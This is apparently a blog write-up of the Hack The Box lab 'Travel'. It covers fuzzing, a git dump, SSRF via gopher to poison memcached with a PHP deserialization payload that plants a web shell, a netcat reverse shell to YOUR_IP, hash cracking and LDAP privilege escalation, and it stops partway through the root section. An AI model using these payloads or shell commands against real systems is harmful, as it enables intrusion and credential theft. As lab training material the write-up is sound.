@@ -1,0 +1,761 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.3 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Travel - #keepLearning</title>
+<meta name="description" content="Write-up of the box Travel from Hack The Box">
+
+
+  <meta name="author" content="Philipp Menner">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="#keepLearning">
+<meta property="og:title" content="HackTheBox - Travel">
+<meta property="og:url" content="http://localhost:4000/boxes/travel/">
+
+
+  <meta property="og:description" content="Write-up of the box Travel from Hack The Box">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-06-29T21:33:36-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/boxes/travel/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Philipp Menner",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="#keepLearning Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          #keepLearning
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Travel">
+    <meta itemprop="description" content="Write-up of the box Travel from Hack The Box">
+    <meta itemprop="datePublished" content="2020-06-29T21:33:36-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Travel
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-cog"></i> Table of Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#starting-the-travel---overview">Starting the travel - Overview</a>
+    <ul>
+      <li><a href="#recon">Recon</a></li>
+      <li><a href="#getting-rce">Getting RCE</a></li>
+      <li><a href="#on-the-box">On the box</a></li>
+    </ul>
+  </li>
+  <li><a href="#root-part">Root part.</a>
+    <ul>
+      <li><a href="#connecting-the-dots">Connecting the dots</a></li>
+    </ul>
+  </li>
+  <li><a href="#resources">Resources</a>
+    <ul>
+      <li><a href="#nmap-scan">Nmap scan</a></li>
+      <li><a href="#tools-and-reading">Tools and reading</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="starting-the-travel---overview">Starting the travel - Overview</h1>
+<p class="text-justify"><code class="language-plaintext highlighter-rouge">Travel</code> is an interesting box created by <a href="https://app.hackthebox.eu/users/77141">jkr</a> and his team member <a href="https://app.hackthebox.eu/users/13569">xct</a>. It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.</p>
+<h2 id="recon">Recon</h2>
+<p>Since <a href="#Nmap scan">the nmap scan</a> just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page mentions a blog, so scanning for subdomains is the next logical step:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--filter</span> <span class="s2">"l!=144"</span> <span class="nt">-z</span> file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> <span class="s2">"http://travel.htb"</span> <span class="nt">-H</span> <span class="s2">"Host: FUZZ.travel.htb"</span>
+
+000000032:   200        345 L    1408 W   24462 Ch    <span class="s2">"blog"</span>                         
+000001035:   200        345 L    1408 W   24462 Ch    <span class="s2">"Blog"</span>                         
+000001226:   200        51 L     126 W    1123 Ch     <span class="s2">"ssl"</span>                          
+000004315:   200        51 L     126 W    1123 Ch     <span class="s2">"SSL"</span> 
+</code></pre></div></div>
+<p>Accessing the blog subdomain reveals a couple of things:</p>
+<ul>
+  <li>user admin</li>
+  <li>Wordpress login at http://blog.travel.htb/wp-login.php</li>
+  <li>WP user registration not allowed</li>
+</ul>
+
+<p class="text-justify">Also, from reading the source code of the landing page we find another subdomain called <code class="language-plaintext highlighter-rouge">http://blog-dev.travel.htb/</code> which we get a 403 forbidden when browsing to. However we can scan this subdomain either with gobuster or nmap to find out that there’s a git repository hidden:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/HTB/boxes/travel<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-T</span> 5 blog.travel.htb
+80/tcp  open  http     nginx 1.17.6
+| http-git:
+|   10.10.10.189:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+|_    Last commit message: moved to git
+
+</code></pre></div></div>
+<p class="text-justify">When fuzzing we need to use an appropriate wordlist such as the default Kali one <code class="language-plaintext highlighter-rouge">dirb/common.txt</code>.
+Now we can use <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to dump the git repository which gives us the following files:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/HTB/boxes/travel/git/clone<span class="nv">$ </span><span class="nb">ls
+</span>README.md		<span class="c"># Mentions the setup of the site, the path `wp-content/themes/twentytwenty`</span>
+rss_template.php	<span class="c"># Reveals how the feed is working, mentions `debug.php`</span>
+template.php		<span class="c"># Contains class `TemplateHelper` and a helper function `safe` which checks an</span>
+			<span class="c"># URL for attempted LFI, command injection or SSRF</span>
+</code></pre></div></div>
+<p><br /></p>
+<h2 id="getting-rce">Getting RCE</h2>
+<p class="text-justify">The next steps all revolve around these three files so reading them thoroughly is definitely recommended.
+If we look at <code class="language-plaintext highlighter-rouge">rss_template.php</code> more closely we see what the mitigations mentioned in the <code class="language-plaintext highlighter-rouge">safe</code> function of <code class="language-plaintext highlighter-rouge">template.php</code> are for:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># From rss_template.php</span>
+<span class="nx">SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>	<span class="c1"># Searches the URL for the first occurence of `custom_feed_url`</span>
+                <span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span>    <span class="c1"># break URL into two parts</span>
+                <span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>               <span class="c1"># set $url to the string after the '='</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>				<span class="c1"># if no custom feed was specified use the following one:</span>
+                <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
+         <span class="p">}</span>
+         <span class="nv">$feed</span> <span class="o">=</span> <span class="nx">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>                <span class="c1"># call get_feed rss</span>
+</code></pre></div></div>
+<p class="text-justify">So reading the code, we can apparently specify a custom feed url. To test this we set up a local http server and try to access it browsing to <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/?custom_feed_url=http://IP:8000/</code> and we record a GET request:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>python <span class="nt">-m</span> http.server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+10.10.10.189 - - <span class="o">[</span>01/AUG/2020 10:25:32] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>Therefore we have a server side request forgery (SSRF) vulnerability, lets see what we can request by looking at how the content is processed:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
+        <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1"># in short:</span>
+<span class="k">return</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"curl "</span><span class="o">.</span><span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span>
+</code></pre></div></div>
+<p class="text-justify">As this is a simple curl call and the input is sanitized via escapeshellarg, I was not able to use this to upload a shell. 
+Looking further at the <code class="language-plaintext highlighter-rouge">safe</code> function from <code class="language-plaintext highlighter-rouge">temlpate.php</code> we see a comment <code class="language-plaintext highlighter-rouge">// this should be secure</code> hinting, that it’s probably not secure. So where can we do something forbidden?
+Playing around a little bit and searching the web <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">I found out</a> that we can circumvent the localhost restriction using the IP <code class="language-plaintext highlighter-rouge">0.0.0.0</code>. What do we want to access on localhost? Well, looking at <code class="language-plaintext highlighter-rouge">rss_template.php</code> again, we see that there is a connection established to a memcached service via</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+</code></pre></div></div>
+<p class="text-justify">Searching now for <code class="language-plaintext highlighter-rouge">memcached SSRF</code> I found the tool <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> which came in handy to create payloads. Following through the steps, choosing the default payload and changing the IP from <code class="language-plaintext highlighter-rouge">127.0.0.1</code> to <code class="language-plaintext highlighter-rouge">0.0.0.0</code> results in the following string, which we enter as the custom feed url:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%2016%0d%0aO:5:%22Hello%22:0:%7B%7D%0d%0a
+</code></pre></div></div>
+<p class="text-justify">To find out whether this worked or not, the <code class="language-plaintext highlighter-rouge">debug.php</code> mentioned in <code class="language-plaintext highlighter-rouge">rss_template.php</code> proofed to be useful. We find it browsing to <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</code> - the path mentioned earlier in the README.md file - showing a table with truncated data after refreshing <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/</code>.</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> </span><span class="err">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
+</span><span class="err">|</span><span class="w"> </span><span class="err">xct_</span><span class="mi">4e5612</span><span class="err">ba</span><span class="mi">07</span><span class="err">(...)</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">a:</span><span class="mi">4</span><span class="err">:</span><span class="p">{</span><span class="err">s:</span><span class="mi">5</span><span class="err">:</span><span class="s2">"child"</span><span class="err">;a:</span><span class="mi">1</span><span class="err">:</span><span class="p">{</span><span class="err">s:</span><span class="mi">0</span><span class="err">:</span><span class="s2">""</span><span class="err">;a:</span><span class="mi">1</span><span class="err">:</span><span class="p">{</span><span class="err">(...)</span><span class="w"> </span><span class="err">|</span><span class="w"> 
+</span><span class="err">~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> </span><span class="err">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
+</span></code></pre></div></div>
+<p>If we use our custom feed url from above we get to see another entry:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> </span><span class="err">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> 
+</span><span class="err">|</span><span class="w"> </span><span class="err">SpyD</span><span class="mi">3</span><span class="err">r</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">O:</span><span class="mi">5</span><span class="err">:</span><span class="nl">"Hello"</span><span class="p">:</span><span class="mi">0</span><span class="err">:</span><span class="p">{}</span><span class="w"> </span><span class="err">|</span><span class="w"> 
+</span><span class="err">|</span><span class="w"> </span><span class="err">xct_</span><span class="mi">4e5612</span><span class="err">ba</span><span class="mi">07</span><span class="err">(...)</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">a:</span><span class="mi">4</span><span class="err">:</span><span class="p">{</span><span class="err">s:</span><span class="mi">5</span><span class="err">:</span><span class="s2">"child"</span><span class="err">;a:</span><span class="mi">1</span><span class="err">:</span><span class="p">{</span><span class="err">s:</span><span class="mi">0</span><span class="err">:</span><span class="s2">""</span><span class="err">;a:</span><span class="mi">1</span><span class="err">:</span><span class="p">{</span><span class="err">(...)</span><span class="w"> </span><span class="err">|</span><span class="w"> 
+</span><span class="err">~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> </span><span class="err">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
+</span></code></pre></div></div>
+<p class="text-justify">So the the awesome-rss blog page is cached in the second row. Once it’s in there it will revert to this entry when refreshing the awesome-rss blog page - but if we can write our payload in there in the meantime it will execute that instead. For this we need the key which is unfortunately truncated. This can be achieved either by reading the simplepie source code (turns out the key is generated by <code class="language-plaintext highlighter-rouge">xct_ + md5(md5(feed_url) + ":spc")</code>) or by deploying things locally. I went for the latter and after some tweaking I retrieved the key from memcached:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+stats items
+STAT items:16:number 1
+<span class="o">[</span>snip]
+stats cachedump 16 100
+ITEM xct_4e5612ba079c530a6b1f148c0b352241 <span class="o">[</span>2737 b<span class="p">;</span> 1595004892 s]
+END
+</code></pre></div></div>
+<p>Now that we got the key we can verify that we are now able to overwrite an existing cache entry. By changing <code class="language-plaintext highlighter-rouge">SpyD3r</code> to <code class="language-plaintext highlighter-rouge">xct_4e5612ba079c530a6b1f148c0b352241</code>. 
+Now, to get RCE, the class <code class="language-plaintext highlighter-rouge">TemplateHelper</code> from the <code class="language-plaintext highlighter-rouge">template.php</code> file might come in handy because of the <code class="language-plaintext highlighter-rouge">file_put_contents</code> function. By following this <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">post</a> on how to exploit php deserialization and using <a href="https://www.unserialize.com/">this tool</a> I came up with the following payload:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="w"> </span><span class="err">Basically,</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">latter</span><span class="w"> </span><span class="err">'O'</span><span class="w"> </span><span class="err">means</span><span class="w"> </span><span class="err">object,</span><span class="w"> </span><span class="err">'s'</span><span class="w"> </span><span class="err">string,</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">digit</span><span class="w"> </span><span class="err">following</span><span class="w"> 
+</span><span class="err">#</span><span class="w"> </span><span class="err">tells</span><span class="w"> </span><span class="err">how</span><span class="w"> </span><span class="err">many</span><span class="w"> </span><span class="err">characters</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">object/string</span><span class="w"> </span><span class="err">consists</span><span class="w"> </span><span class="err">of</span><span class="w">
+</span><span class="err">O:</span><span class="mi">14</span><span class="err">:</span><span class="nl">"TemplateHelper"</span><span class="p">:</span><span class="mi">2</span><span class="err">:</span><span class="p">{</span><span class="err">s:</span><span class="mi">4</span><span class="err">:</span><span class="s2">"file"</span><span class="err">;s:</span><span class="mi">8</span><span class="err">:</span><span class="s2">"this.php"</span><span class="err">;s:</span><span class="mi">4</span><span class="err">:</span><span class="s2">"data"</span><span class="err">;s:</span><span class="mi">31</span><span class="err">:</span><span class="s2">"&lt;?php system($_GET['this']); ?&gt;"</span><span class="err">;</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p class="text-justify">This payload creates a file called <code class="language-plaintext highlighter-rouge">this.php</code> in the <code class="language-plaintext highlighter-rouge">logs</code> folder containing <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['this']); ?&gt;</code>. This way we can get a reverse shell in three steps, after URL encoding:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Overwriting the cache</span>
+http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url<span class="o">=</span>gopher://0.0.0.0:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20102%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22this.php%22%3Bs:4:%22data%22%3Bs:31:%22%3C%3Fphp%20system%28%24_GET%5B%27this%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+<span class="c"># Command execution via `nc -e` reverse shell</span>
+http://blog.travel.htb/wp-content/themes/twentytwenty/logs/this.php?this<span class="o">=</span>nc%20-e%20/bin/sh%20YOUR_IP%201234
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 1234
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:57904.
+<span class="nb">ls
+</span>this.php
+</code></pre></div></div>
+<p><br /></p>
+<h2 id="on-the-box">On the box</h2>
+<p>This was hard work but the steps to user are walked fast: A bit of enumeration shows an unusual SQL dump in /opt:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INSERT INTO <span class="sb">`</span>wp_users<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'</span>,<span class="s1">'admin'</span>,<span class="s1">'admin@travel.htb'</span>,<span class="s1">'http://localhost'</span>,<span class="s1">'2020-04-13 13:19:01'</span>,<span class="s1">''</span>,0,<span class="s1">'admin'</span><span class="o">)</span>,<span class="o">(</span>2,<span class="s1">'lynik-admin'</span>,<span class="s1">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span>,<span class="s1">'lynik-admin'</span>,<span class="s1">'lynik@travel.htb'</span>,<span class="s1">''</span>,<span class="s1">'2020-04-13 13:36:18'</span>,<span class="s1">''</span>,0,<span class="s1">'Lynik Schmidt'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+<p class="text-justify">Cracking the PW of lynik-admin with john and the usual <code class="language-plaintext highlighter-rouge">rockyou.txt</code> results in <code class="language-plaintext highlighter-rouge">1stepcloser</code> which made me smirk. This is his ssh password and we obtain the user flag, now smiling.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+</code></pre></div></div>
+<p><br /></p>
+<h1 id="root-part">Root part.</h1>
+<p>It’s a good habit to start looking where you land and here, it paid big time:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
+<span class="nb">.</span>  ..  .bash_history  .bash_logout  .bashrc  .cache  .ldaprc  .profile  user.txt  .viminfo
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .ldaprc 
+HOST ldap.travel.htb
+BASE <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+BINDDN <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+</code></pre></div></div>
+<p>To verify we are on the right track we look at <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to see if/how the domain is resolved:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 travel
+172.20.0.10 ldap.travel.htb
+</code></pre></div></div>
+<h2 id="connecting-the-dots">Connecting the dots</h2>
+<p>We start out by trying to query the ldap service right away and are greeted by <code class="language-plaintext highlighter-rouge">Invalid credentials</code> using several passwords we found along the way:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span>ldapsearch ldap.travel.htb <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="s2">"uid=lynik-admin"</span> <span class="nt">-x</span> <span class="nt">-w</span> 1stepcloser
+ldap_bind: Invalid credentials <span class="o">(</span>49<span class="o">)</span>
+</code></pre></div></div>
+<p>Thus we investigate our home directory even more and find the LDAP password inside <code class="language-plaintext highlighter-rouge">.viminfo</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .viminfo 
+<span class="o">[</span>snip]
+<span class="c"># Registers:</span>
+<span class="s2">""</span>1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,<span class="s2">"BINDPW Theroadlesstraveled"</span>
+</code></pre></div></div>
+<p>Now, the above <code class="language-plaintext highlighter-rouge">ldapsearch</code> command works using <code class="language-plaintext highlighter-rouge">Theroadlesstraveled</code> as password. We notice a bunch of users and that lynik-admin is a LDAP admin:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://ldap.travel.htb <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-w</span> Theroadlesstraveled
+<span class="c"># lynik-admin, travel.htb</span>
+dn: <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: <span class="nv">e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ</span><span class="o">==</span> <span class="c"># -&gt; Theroadlesstraveled</span>
+
+<span class="o">[</span>snip]
+
+<span class="c"># domainusers, groups, linux, servers, travel.htb</span>
+dn: <span class="nv">cn</span><span class="o">=</span>domainusers,ou<span class="o">=</span><span class="nb">groups</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+memberUid: frank
+memberUid: brian
+memberUid: christopher
+memberUid: johnny
+memberUid: julia
+memberUid: jerry
+memberUid: louise
+memberUid: eugene
+memberUid: edward
+memberUid: gloria
+memberUid: lynik
+gidNumber: 5000
+cn: domainusers
+objectClass: top
+objectClass: posixGroup
+</code></pre></div></div>
+<p>Also <code class="language-plaintext highlighter-rouge">getent passwd</code> shows the users from <code class="language-plaintext highlighter-rouge">ldapsearch</code> and <code class="language-plaintext highlighter-rouge">getent group</code> lists them in the group <code class="language-plaintext highlighter-rouge">domainusers</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank:<span class="k">*</span>:5001:5000:Frank Stewart:/home@TRAVEL/frank:/bin/bash
+gloria:<span class="k">*</span>:5010:5000:Gloria Wood:/home@TRAVEL/gloria:/bin/bash
+jane:<span class="k">*</span>:5005:5000:Jane Rodriguez:/home@TRAVEL/jane:/bin/bash
+christopher:<span class="k">*</span>:5003:5000:Christopher Ward:/home@TRAVEL/christopher:/bin/bash
+jerry:<span class="k">*</span>:5006:5000:Jerry Morgan:/home@TRAVEL/jerry:/bin/bash
+lynik:<span class="k">*</span>:5000:5000:Lynik Schmidt:/home@TRAVEL/lynik:/bin/bash
+johnny:<span class="k">*</span>:5004:5000:Johnny Miller:/home@TRAVEL/johnny:/bin/bash
+eugene:<span class="k">*</span>:5008:5000:Eugene Scott:/home@TRAVEL/eugene:/bin/bash
+brian:<span class="k">*</span>:5002:5000:Brian Bell:/home@TRAVEL/brian:/bin/bash
+louise:<span class="k">*</span>:5007:5000:Louise Griffin:/home@TRAVEL/louise:/bin/bash
+edward:<span class="k">*</span>:5009:5000:Edward Roberts:/home@TRAVEL/edward:/bin/bash
+
+domainusers:<span class="k">*</span>:5000:frank,brian,christopher,johnny,jerry,louise,eugene,edward,gloria,lynik,julia
+</code></pre></div></div>
+<p>So after reading up a bit, to see what we can do with our privileges, the following seems most promising:</p>
+<ul>
+  <li>modifying their UID and GID -&gt; even if we can’t become root directly we might be able to exploit docker/lxd</li>
+  <li>adding SSH public keys -&gt; to log in</li>
+</ul>
+
+<p>These two options will indeed elevate us to root. In order to modify the attributes of users using the <code class="language-plaintext highlighter-rouge">ldapmodify</code> command we need to create so called <code class="language-plaintext highlighter-rouge">.ldif</code> files:</p>
